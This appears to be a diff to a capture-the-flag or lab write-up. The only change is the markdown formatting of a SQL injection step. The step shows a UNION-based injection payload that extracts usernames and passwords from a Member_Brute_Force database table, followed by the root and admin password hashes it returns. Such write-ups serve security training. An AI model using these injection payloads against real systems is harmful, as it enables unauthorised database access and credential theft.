@@ -2,7 +2,7 @@
 
 In the members sql injection we got to know all the DB tables. Among them there was db_default table in Member_Brute_Force DB wich contains some usernames and passwords
 
-``1 or 1 = 1 UNION SELECT username,password FROM Member_Brute_Force.db_default``
+`1 or 1 = 1 UNION SELECT username,password FROM Member_Brute_Force.db_default`
 
 root:3bf1114a986ba87ed28fc1b5884fc2f8      
 admin:3bf1114a986ba87ed28fc1b5884fc2f8
